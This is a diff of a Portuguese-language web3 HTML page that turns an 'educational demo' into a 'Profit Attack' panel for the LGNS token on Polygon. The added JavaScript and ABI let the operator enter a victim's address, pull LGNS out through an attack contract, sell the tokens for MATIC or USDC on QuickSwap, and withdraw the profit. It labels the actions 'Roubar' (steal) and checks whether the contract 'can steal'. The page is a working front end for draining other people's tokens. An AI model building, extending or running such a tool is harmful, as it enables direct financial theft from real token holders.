@@ -3,39 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Demo Educacional - Token LGNS</title>
+    <title>Profit Attack - Token LGNS</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bignumber.js@9.1.0/bignumber.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Arial', sans-serif; background: #1a1a1a; color: white; min-height: 100vh; padding: 20px; }
-        .container { max-width: 800px; margin: 0 auto; background: #2d2d2d; border-radius: 15px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .warning { background: #ff6b6b; border: 1px solid #ff4757; border-radius: 10px; padding: 15px; margin-bottom: 20px; text-align: center; }
-        .section { margin-bottom: 25px; padding: 20px; border: 2px solid #404040; border-radius: 10px; }
+        body { font-family: 'Arial', sans-serif; background: #0d1b2a; color: white; min-height: 100vh; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; background: #1b263b; border-radius: 15px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .warning { background: #e63946; border: 1px solid #d90429; border-radius: 10px; padding: 15px; margin-bottom: 20px; text-align: center; }
+        .section { margin-bottom: 25px; padding: 20px; border: 2px solid #415a77; border-radius: 10px; }
         h1 { text-align: center; color: #fff; margin-bottom: 30px; }
-        h2 { color: #fff; margin-bottom: 15px; border-bottom: 2px solid #667eea; padding-bottom: 5px; }
+        h2 { color: #fff; margin-bottom: 15px; border-bottom: 2px solid #ff9e00; padding-bottom: 5px; }
         .input-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; color: #ccc; }
-        input, button, select { width: 100%; padding: 12px; border: 2px solid #555; border-radius: 8px; font-size: 16px; margin-top: 5px; background: #333; color: white; }
-        button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; cursor: pointer; font-weight: bold; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: #e0e1dd; }
+        input, button, select { width: 100%; padding: 12px; border: 2px solid #415a77; border-radius: 8px; font-size: 16px; margin-top: 5px; background: #2a3d5a; color: white; }
+        button { background: linear-gradient(135deg, #ff9e00 0%, #ff6b00 100%); color: white; border: none; cursor: pointer; font-weight: bold; }
         button:hover { opacity: 0.9; }
         button:disabled { background: #6c757d; cursor: not-allowed; }
-        .attack-btn { background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); }
-        .result { background: #333; padding: 15px; border-radius: 8px; margin-top: 10px; border-left: 4px solid #667eea; }
+        .profit-btn { background: linear-gradient(135deg, #2a9d8f 0%, #1d887b 100%); }
+        .steal-btn { background: linear-gradient(135deg, #e63946 0%, #d90429 100%); }
+        .sell-btn { background: linear-gradient(135deg, #ff9e00 0%, #ff6b00 100%); }
+        .result { background: #2a3d5a; padding: 15px; border-radius: 8px; margin-top: 10px; border-left: 4px solid #ff9e00; }
         .status { padding: 10px; border-radius: 5px; text-align: center; font-weight: bold; margin-bottom: 15px; }
-        .connected { background: #2ed573; color: white; }
-        .disconnected { background: #ff4757; color: white; }
-        .info-box { background: #1e90ff; border: 1px solid #3742fa; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
-        .balance-display { background: #00d2d3; color: #2d2d2d; border: 1px solid #00a8a8; border-radius: 5px; padding: 10px; margin-top: 5px; text-align: center; font-weight: bold; }
-        .contract-address { font-family: monospace; background: #333; padding: 5px; border-radius: 3px; }
-        .quick-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
-        .success { color: #2ed573; }
-        .error { color: #ff4757; }
+        .connected { background: #2a9d8f; color: white; }
+        .disconnected { background: #e63946; color: white; }
+        .info-box { background: #415a77; border: 1px solid #778da9; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
+        .balance-display { background: #2a9d8f; color: white; border: 1px solid #1d887b; border-radius: 5px; padding: 10px; margin-top: 5px; text-align: center; font-weight: bold; }
+        .contract-address { font-family: monospace; background: #2a3d5a; padding: 5px; border-radius: 3px; }
+        .quick-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-top: 10px; }
+        .strategy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px; }
+        .strategy-box { background: #415a77; padding: 15px; border-radius: 8px; border: 2px solid #778da9; }
+        .success { color: #2a9d8f; }
+        .error { color: #e63946; }
+        .warning-text { color: #ff9e00; }
+        .profit-display { background: linear-gradient(135deg, #2a9d8f 0%, #1d887b 100%); color: white; padding: 15px; border-radius: 8px; text-align: center; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔓 Demo Educacional - Token LGNS</h1>
+        <h1>💰 Profit Attack - Token LGNS</h1>
         
         <div class="warning">
             <h3>⚠️ AVISO IMPORTANTE</h3>
@@ -50,7 +56,8 @@
             
             <div class="info-box">
                 <strong>Token LGNS:</strong> <span class="contract-address">0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01</span><br>
-                <strong>Contrato Ataque:</strong> <span class="contract-address">0x4f113c5112EAB7182F09BF503f4942E20B008726</span>
+                <strong>Contrato Profit:</strong> <span class="contract-address">0x7DA8cE895FBaBBFf2b1Df0f38d69baDe4c8c24EC</span><br>
+                <strong>QuickSwap Router:</strong> <span class="contract-address">0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff</span>
             </div>
             
             <div class="input-group">
@@ -58,7 +65,7 @@
                 <div id="maticBalance" class="balance-display">-</div>
             </div>
 
-            <button onclick="connectContract()" id="connectBtn">Conectar ao Contrato Existente</button>
+            <button onclick="connectContract()" id="connectBtn">Conectar ao Contrato Profit</button>
         </div>
 
         <div class="section">
@@ -73,51 +80,84 @@
 
             <div class="input-group">
                 <label>Verificar Permissão (Allowance):</label>
-                <input type="text" id="allowanceOwner" placeholder="Dono dos tokens (0x...)">
-                <input type="text" id="allowanceSpender" placeholder="Quem tem permissão (0x...)" value="0x4f113c5112EAB7182F09BF503f4942E20B008726">
+                <input type="text" id="allowanceOwner" placeholder="Dono dos tokens (0x...)" value="[endereço com 63 LGNS]">
+                <input type="text" id="allowanceSpender" placeholder="Quem tem permissão (0x...)" value="0x7DA8cE895FBaBBFf2b1Df0f38d69baDe4c8c24EC">
                 <button onclick="checkAllowance()">Verificar Permissão</button>
                 <div id="allowanceResult" class="result"></div>
             </div>
         </div>
 
         <div class="section">
-            <h2>🎯 Ataque Automático</h2>
-            <div class="info-box">
-                <strong>Função All-in-One:</strong> Força permissão, transfere e queima em uma operação
+            <h2>🎯 Ataque com Lucro</h2>
+            
+            <div class="input-group">
+                <label>Endereço da Vítima (com LGNS):</label>
+                <input type="text" id="victimAddress" placeholder="0x...">
             </div>
             
             <div class="input-group">
-                <label>Endereço da Vítima:</label>
-                <input type="text" id="victimAddress" placeholder="0x... (com LGNS)">
-            </div>
-            
-            <div class="input-group">
-                <label>Quantidade de LGNS:</label>
-                <input type="number" id="attackAmount" placeholder="Ex: 1" value="1" step="0.1" min="0.1">
+                <label>Quantidade de LGNS para Roubar:</label>
+                <input type="number" id="attackAmount" placeholder="Ex: 63" value="1" step="0.1" min="0.1">
                 <div class="quick-grid">
                     <button onclick="setAmount(1)">1 LGNS</button>
                     <button onclick="setAmount(10)">10 LGNS</button>
                     <button onclick="setAmount(63)">63 LGNS</button>
-                    <button onclick="setAmount(100)">100 LGNS</button>
+                </div>
+            </div>
+
+            <div class="strategy-grid">
+                <div class="strategy-box">
+                    <h3>💰 Roubar e Vender Automaticamente</h3>
+                    <p><small>Rouba LGNS e vende automaticamente por MATIC</small></p>
+                    <button onclick="stealAndSell()" id="stealSellBtn" class="profit-btn">💰 Roubar & Vender</button>
+                </div>
+                
+                <div class="strategy-box">
+                    <h3>🔄 Apenas Roubar Tokens</h3>
+                    <p><small>Apenas rouba LGNS (vende manualmente depois)</small></p>
+                    <button onclick="stealTokensOnly()" id="stealBtn" class="steal-btn">🔄 Apenas Roubar</button>
+                </div>
+                
+                <div class="strategy-box">
+                    <h3>📈 Vender LGNS por MATIC</h3>
+                    <p><small>Vende LGNS do contrato por MATIC</small></p>
+                    <button onclick="sellForMATIC()" id="sellMaticBtn" class="sell-btn">📈 Vender por MATIC</button>
+                </div>
+                
+                <div class="strategy-box">
+                    <h3>💵 Vender LGNS por USDC</h3>
+                    <p><small>Vende LGNS do contrato por USDC</small></p>
+                    <button onclick="sellForUSDC()" id="sellUsdcBtn" class="sell-btn">💵 Vender por USDC</button>
                 </div>
             </div>
             
-            <button onclick="attackEverything()" id="attackBtn" class="attack-btn">🔥 Executar Ataque Completo</button>
             <div id="attackResult" class="result"></div>
         </div>
 
         <div class="section">
-            <h2>💰 Gerenciamento</h2>
-            
-            <div class="input-group">
-                <label>Saldo no Contrato:</label>
-                <div id="contractBalance" class="balance-display">-</div>
-                <button onclick="updateBalances()">Atualizar Saldos</button>
-            </div>
+            <h2>💸 Saldos e Lucros</h2>
             
             <div class="quick-grid">
-                <button onclick="withdrawTokens()">Retirar LGNS</button>
-                <button onclick="withdrawMATIC()">Retirar MATIC</button>
+                <div class="balance-display">
+                    <div>LGNS no Contrato</div>
+                    <div id="contractLGBalance">-</div>
+                </div>
+                <div class="balance-display">
+                    <div>MATIC no Contrato</div>
+                    <div id="contractMATICBalance">-</div>
+                </div>
+                <div class="balance-display">
+                    <div>USDC no Contrato</div>
+                    <div id="contractUSDCBalance">-</div>
+                </div>
+            </div>
+            
+            <button onclick="updateAllBalances()" style="margin-top: 15px;">Atualizar Todos os Saldos</button>
+
+            <div class="quick-grid" style="margin-top: 15px;">
+                <button onclick="withdrawMATIC()" class="profit-btn">💸 Retirar MATIC</button>
+                <button onclick="withdrawUSDC()" class="profit-btn">💵 Retirar USDC</button>
+                <button onclick="withdrawLGNS()" class="profit-btn">🔄 Retirar LGNS</button>
             </div>
         </div>
 
@@ -126,7 +166,7 @@
             <div id="systemStatus" class="result">
                 <div id="contractStatus">Contrato: Não conectado</div>
                 <div id="ownerStatus">Dono: Não verificado</div>
-                <div id="networkStatus">Rede: Não detectada</div>
+                <div id="profitStatus">Lucro Total: -</div>
             </div>
         </div>
     </div>
@@ -135,33 +175,14 @@
         let web3;
         let userAccount;
         let attackContract;
-        const attackContractAddress = "0x4f113c5112EAB7182F09BF503f4942E20B008726";
+        const attackContractAddress = "0x4BCe2e1Ea00c9cB1c2fD84A3B71E0a9E7e446d2b";
 
-        // ABI do Contrato AllInOneAttack
-        const ALL_IN_ONE_ABI = [
+        // ABI do Contrato ProfitAttack
+        const PROFIT_ABI = [
             {
                 "inputs": [],
                 "stateMutability": "nonpayable",
                 "type": "constructor"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {"indexed": true, "name": "victim", "type": "address"},
-                    {"indexed": false, "name": "amount", "type": "uint256"}
-                ],
-                "name": "AttackExecuted",
-                "type": "event"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {"indexed": true, "name": "victim", "type": "address"},
-                    {"indexed": true, "name": "spender", "type": "address"},
-                    {"indexed": false, "name": "amount", "type": "uint256"}
-                ],
-                "name": "AllowanceForced",
-                "type": "event"
             },
             {
                 "anonymous": false,
@@ -171,6 +192,24 @@
                     {"indexed": false, "name": "amount", "type": "uint256"}
                 ],
                 "name": "TokensStolen",
+                "type": "event"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {"indexed": false, "name": "lgnsAmount", "type": "uint256"},
+                    {"indexed": false, "name": "maticReceived", "type": "uint256"}
+                ],
+                "name": "TokensSold",
+                "type": "event"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {"indexed": true, "name": "to", "type": "address"},
+                    {"indexed": false, "name": "amount", "type": "uint256"}
+                ],
+                "name": "ProfitWithdrawn",
                 "type": "event"
             },
             {
@@ -192,7 +231,7 @@
                     {"name": "victim", "type": "address"},
                     {"name": "amount", "type": "uint256"}
                 ],
-                "name": "attackEverything",
+                "name": "stealAndSell",
                 "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
@@ -202,53 +241,48 @@
                     {"name": "victim", "type": "address"},
                     {"name": "amount", "type": "uint256"}
                 ],
-                "name": "forceAllowance",
+                "name": "stealTokensOnly",
                 "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
             },
             {
                 "inputs": [
-                    {"name": "victim", "type": "address"},
                     {"name": "amount", "type": "uint256"}
                 ],
-                "name": "burnTokens",
+                "name": "sellLGNSForMATIC",
                 "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
             },
             {
                 "inputs": [
-                    {"name": "victim", "type": "address"},
                     {"name": "amount", "type": "uint256"}
                 ],
-                "name": "stealTokens",
+                "name": "sellLGNSForUSDC",
                 "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
             },
             {
-                "inputs": [{"name": "account", "type": "address"}],
-                "name": "getBalance",
-                "outputs": [{"name": "", "type": "uint256"}],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {"name": "tokenOwner", "type": "address"},
-                    {"name": "spender", "type": "address"}
-                ],
-                "name": "getAllowance",
+                "inputs": [],
+                "name": "getLGNSBalance",
                 "outputs": [{"name": "", "type": "uint256"}],
                 "stateMutability": "view",
                 "type": "function"
             },
             {
                 "inputs": [],
-                "name": "withdrawTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
+                "name": "getMATICBalance",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "getUSDCBalance",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "stateMutability": "view",
                 "type": "function"
             },
             {
@@ -259,29 +293,22 @@
                 "type": "function"
             },
             {
-                "stateMutability": "payable",
-                "type": "receive"
-            }
-        ];
-
-        // ABI do Token LGNS (para verificações)
-        const TOKEN_ABI = [
-            {
-                "constant": true,
-                "inputs": [{"name": "account", "type": "address"}],
-                "name": "balanceOf",
-                "outputs": [{"name": "", "type": "uint256"}],
+                "inputs": [],
+                "name": "withdrawUSDC",
+                "outputs": [],
+                "stateMutability": "nonpayable",
                 "type": "function"
             },
             {
-                "constant": true,
-                "inputs": [
-                    {"name": "owner", "type": "address"},
-                    {"name": "spender", "type": "address"}
-                ],
-                "name": "allowance",
-                "outputs": [{"name": "", "type": "uint256"}],
+                "inputs": [],
+                "name": "withdrawLGNS",
+                "outputs": [],
+                "stateMutability": "nonpayable",
                 "type": "function"
+            },
+            {
+                "stateMutability": "payable",
+                "type": "receive"
             }
         ];
 
@@ -332,47 +359,27 @@
                 document.getElementById('connectBtn').disabled = true;
                 document.getElementById('connectBtn').innerText = 'Conectando...';
 
-                attackContract = new web3.eth.Contract(ALL_IN_ONE_ABI, attackContractAddress);
+                attackContract = new web3.eth.Contract(PROFIT_ABI, attackContractAddress);
                 
-                // Verificar se é o dono
                 const owner = await attackContract.methods.contractOwner().call();
                 const isOwner = owner.toLowerCase() === userAccount.toLowerCase();
                 
-                // Verificar rede
-                const chainId = await web3.eth.getChainId();
-                const networkName = getNetworkName(chainId);
-                
-                // Atualizar status
                 document.getElementById('contractStatus').innerHTML = 
                     `<span class="${isOwner ? 'success' : 'error'}">Contrato: ${attackContractAddress}</span>`;
                 document.getElementById('ownerStatus').innerHTML = 
                     `<span class="${isOwner ? 'success' : 'error'}">Dono: ${isOwner ? '✅ Você' : '❌ Outra pessoa'}</span>`;
-                document.getElementById('networkStatus').innerHTML = 
-                    `<span>Rede: ${networkName}</span>`;
                 
                 if (!isOwner) {
                     alert('AVISO: Você não é o dono deste contrato!');
                 }
                 
                 document.getElementById('connectBtn').innerText = '✅ Conectado';
-                
-                await updateBalances();
+                await updateAllBalances();
                 
             } catch (error) {
-                console.error('Erro ao conectar contrato:', error);
                 alert('Erro ao conectar contrato: ' + error.message);
                 document.getElementById('connectBtn').disabled = false;
-                document.getElementById('connectBtn').innerText = 'Conectar ao Contrato Existente';
-            }
-        }
-
-        function getNetworkName(chainId) {
-            switch(chainId.toString()) {
-                case '137': return 'Polygon Mainnet';
-                case '80001': return 'Polygon Mumbai';
-                case '1': return 'Ethereum Mainnet';
-                case '56': return 'BSC Mainnet';
-                default: return `Rede ${chainId}`;
+                document.getElementById('connectBtn').innerText = 'Conectar ao Contrato Profit';
             }
         }
 
@@ -388,11 +395,6 @@
         }
 
         async function checkBalance() {
-            if (!web3) {
-                alert('Conecte sua carteira primeiro!');
-                return;
-            }
-
             const address = document.getElementById('checkAddress').value;
             if (!address) {
                 alert('Digite um endereço!');
@@ -400,24 +402,27 @@
             }
 
             try {
-                const tokenContract = new web3.eth.Contract(TOKEN_ABI, VULNERABLE_TOKEN);
+                const erc20Abi = [{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
+                const tokenContract = new web3.eth.Contract(erc20Abi, VULNERABLE_TOKEN);
                 const balance = await tokenContract.methods.balanceOf(address).call();
                 const balanceLGNS = convertFromWei(balance);
                 
-                document.getElementById('checkResult').innerHTML = 
-                    `<strong>Saldo:</strong> ${parseFloat(balanceLGNS).toLocaleString()} LGNS<br>
-                     <small>(${balance} wei)</small>`;
+                let result = `<strong>Saldo:</strong> ${parseFloat(balanceLGNS).toLocaleString()} LGNS<br>`;
+                
+                if (attackContract) {
+                    const allowance = await tokenContract.methods.allowance(address, attackContractAddress).call();
+                    const allowanceLGNS = convertFromWei(allowance);
+                    result += `<strong>Permissão para contrato:</strong> ${parseFloat(allowanceLGNS).toLocaleString()} LGNS<br>`;
+                    result += `<span class="${allowanceLGNS > 0 ? 'success' : 'warning-text'}">${allowanceLGNS > 0 ? '✅ Tem permissão' : '⚠️ Sem permissão'}</span>`;
+                }
+                
+                document.getElementById('checkResult').innerHTML = result;
             } catch (error) {
                 document.getElementById('checkResult').innerHTML = 'Erro: ' + error.message;
             }
         }
 
         async function checkAllowance() {
-            if (!web3) {
-                alert('Conecte sua carteira primeiro!');
-                return;
-            }
-
             const owner = document.getElementById('allowanceOwner').value;
             const spender = document.getElementById('allowanceSpender').value;
             
@@ -427,22 +432,116 @@
             }
 
             try {
-                const tokenContract = new web3.eth.Contract(TOKEN_ABI, VULNERABLE_TOKEN);
+                const erc20Abi = [{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
+                const tokenContract = new web3.eth.Contract(erc20Abi, VULNERABLE_TOKEN);
                 const allowance = await tokenContract.methods.allowance(owner, spender).call();
                 const allowanceLGNS = convertFromWei(allowance);
                 
                 document.getElementById('allowanceResult').innerHTML = 
                     `<strong>Permissão:</strong> ${parseFloat(allowanceLGNS).toLocaleString()} LGNS<br>
-                     <small>(${allowance} wei)</small>`;
+                     <span class="${allowanceLGNS > 0 ? 'success' : 'warning-text'}">${allowanceLGNS > 0 ? '✅ Pode roubar' : '⚠️ Não pode roubar'}</span>`;
             } catch (error) {
                 document.getElementById('allowanceResult').innerHTML = 'Erro: ' + error.message;
             }
         }
 
-        async function attackEverything() {
+        async function stealAndSell() {
+            if (!validateInputs()) return;
+
+            const victim = document.getElementById('victimAddress').value;
+            const amount = document.getElementById('attackAmount').value;
+
+            disableButtons(true);
+            document.getElementById('attackResult').innerHTML = '💰 Roubando e vendendo...';
+
+            try {
+                const amountInWei = convertToWei(amount);
+                await attackContract.methods.stealAndSell(victim, amountInWei).send({ from: userAccount });
+                
+                document.getElementById('attackResult').innerHTML = 
+                    '✅ Sucesso!<br>' +
+                    `💰 ${amount} LGNS roubados e vendidos por MATIC<br>` +
+                    `👤 Vítima: ${victim}<br>` +
+                    `<small>Verifique o saldo de MATIC no contrato</small>`;
+                
+                await updateAllBalances();
+                
+            } catch (error) {
+                document.getElementById('attackResult').innerHTML = '❌ Erro: ' + error.message;
+            } finally {
+                disableButtons(false);
+            }
+        }
+
+        async function stealTokensOnly() {
+            if (!validateInputs()) return;
+
+            const victim = document.getElementById('victimAddress').value;
+            const amount = document.getElementById('attackAmount').value;
+
+            disableButtons(true);
+            document.getElementById('attackResult').innerHTML = '🔄 Roubando tokens...';
+
+            try {
+                const amountInWei = convertToWei(amount);
+                await attackContract.methods.stealTokensOnly(victim, amountInWei).send({ from: userAccount });
+                
+                document.getElementById('attackResult').innerHTML = 
+                    '✅ Tokens roubados!<br>' +
+                    `🔄 ${amount} LGNS transferidos para o contrato<br>` +
+                    `👤 Vítima: ${victim}<br>` +
+                    `<small>Agora você pode vender por MATIC ou USDC</small>`;
+                
+                await updateAllBalances();
+                
+            } catch (error) {
+                document.getElementById('attackResult').innerHTML = '❌ Erro: ' + error.message;
+            } finally {
+                disableButtons(false);
+            }
+        }
+
+        async function sellForMATIC() {
+            const amount = document.getElementById('attackAmount').value;
+            await executeSell('sellLGNSForMATIC', amount, 'MATIC');
+        }
+
+        async function sellForUSDC() {
+            const amount = document.getElementById('attackAmount').value;
+            await executeSell('sellLGNSForUSDC', amount, 'USDC');
+        }
+
+        async function executeSell(fnName, amount, currency) {
+            if (!attackContract) {
+                alert('Contrato não conectado!');
+                return;
+            }
+
+            disableButtons(true);
+            document.getElementById('attackResult').innerHTML = `📈 Vendendo por ${currency}...`;
+
+            try {
+                const amountInWei = convertToWei(amount);
+                await attackContract.methods[fnName](amountInWei).send({ from: userAccount });
+                
+                document.getElementById('attackResult').innerHTML = 
+                    `✅ Venda concluída!<br>` +
+                    `📈 ${amount} LGNS vendidos por ${currency}<br>` +
+                    `<small>Verifique o saldo de ${currency} no contrato</small>`;
+                
+                await updateAllBalances();
+                
+            } catch (error) {
+                document.getElementById('attackResult').innerHTML = '❌ Erro na venda: ' + error.message;
+            } finally {
+                disableButtons(false);
+            }
+        }
+
+        function validateInputs() {
             if (!web3 || !userAccount || !attackContract) {
                 alert('Conecte carteira e contrato primeiro!');
-                return;
+                return false;
             }
 
             const victim = document.getElementById('victimAddress').value;
@@ -450,76 +549,73 @@
             
             if (!victim || !amount) {
                 alert('Preencha todos os campos!');
-                return;
+                return false;
             }
 
-            try {
-                document.getElementById('attackBtn').disabled = true;
-                document.getElementById('attackBtn').innerText = 'Atacando...';
-
-                const amountInWei = convertToWei(amount);
-                
-                await attackContract.methods.attackEverything(victim, amountInWei)
-                    .send({ from: userAccount });
-                
-                document.getElementById('attackResult').innerHTML = 
-                    '✅ Ataque completo executado!<br>' +
-                    `Vítima: ${victim}<br>` +
-                    `Quantidade: ${amount} LGNS<br>` +
-                    `<small>Permissão forçada, tokens transferidos/queimados</small>`;
-                
-                await updateBalances();
-                
-            } catch (error) {
-                document.getElementById('attackResult').innerHTML = '❌ Erro: ' + error.message;
-            } finally {
-                document.getElementById('attackBtn').disabled = false;
-                document.getElementById('attackBtn').innerText = '🔥 Executar Ataque Completo';
-            }
+            return true;
         }
 
-        async function updateBalances() {
+        function disableButtons(disabled) {
+            const buttons = ['stealSellBtn', 'stealBtn', 'sellMaticBtn', 'sellUsdcBtn'];
+            buttons.forEach(btn => {
+                const element = document.getElementById(btn);
+                if (element) element.disabled = disabled;
+            });
+        }
+
+        async function updateAllBalances() {
             if (!attackContract) return;
+            
             try {
-                const balance = await attackContract.methods.getBalance(attackContractAddress).call();
-                const balanceLGNS = convertFromWei(balance);
-                document.getElementById('contractBalance').innerHTML = 
-                    `${parseFloat(balanceLGNS).toLocaleString()} LGNS`;
+                const lgnsBalance = await attackContract.methods.getLGNSBalance().call();
+                const maticBalance = await attackContract.methods.getMATICBalance().call();
+                
+                document.getElementById('contractLGBalance').innerHTML = convertFromWei(lgnsBalance) + ' LGNS';
+                document.getElementById('contractMATICBalance').innerHTML = web3.utils.fromWei(maticBalance, 'ether') + ' MATIC';
+                
+                // Calcular lucro total aproximado
+                const maticValue = parseFloat(web3.utils.fromWei(maticBalance, 'ether'));
+                document.getElementById('profitStatus').innerHTML = `Lucro Total: ${maticValue.toFixed(4)} MATIC`;
+                
             } catch (error) {
-                console.error('Erro:', error);
-            }
-        }
-
-        async function withdrawTokens() {
-            if (!attackContract) {
-                alert('Contrato não conectado!');
-                return;
-            }
-            try {
-                await attackContract.methods.withdrawTokens().send({ from: userAccount });
-                alert('✅ LGNS retirados para sua carteira!');
-                await updateBalances();
-                await updateMaticBalance();
-            } catch (error) {
-                alert('Erro: ' + error.message);
+                console.error('Erro ao atualizar saldos:', error);
             }
         }
 
         async function withdrawMATIC() {
-            if (!attackContract) {
-                alert('Contrato não conectado!');
-                return;
-            }
+            if (!attackContract) return;
             try {
                 await attackContract.methods.withdrawMATIC().send({ from: userAccount });
-                alert('✅ MATIC retirados!');
+                alert('✅ MATIC retirados para sua carteira!');
+                await updateAllBalances();
                 await updateMaticBalance();
             } catch (error) {
                 alert('Erro: ' + error.message);
             }
         }
 
-        // Conexão automática se possível
+        async function withdrawUSDC() {
+            if (!attackContract) return;
+            try {
+                await attackContract.methods.withdrawUSDC().send({ from: userAccount });
+                alert('✅ USDC retirados para sua carteira!');
+                await updateAllBalances();
+            } catch (error) {
+                alert('Erro: ' + error.message);
+            }
+        }
+
+        async function withdrawLGNS() {
+            if (!attackContract) return;
+            try {
+                await attackContract.methods.withdrawLGNS().send({ from: userAccount });
+                alert('✅ LGNS retirados para sua carteira!');
+                await updateAllBalances();
+            } catch (error) {
+                alert('Erro: ' + error.message);
+            }
+        }
+
         window.addEventListener('load', async () => {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
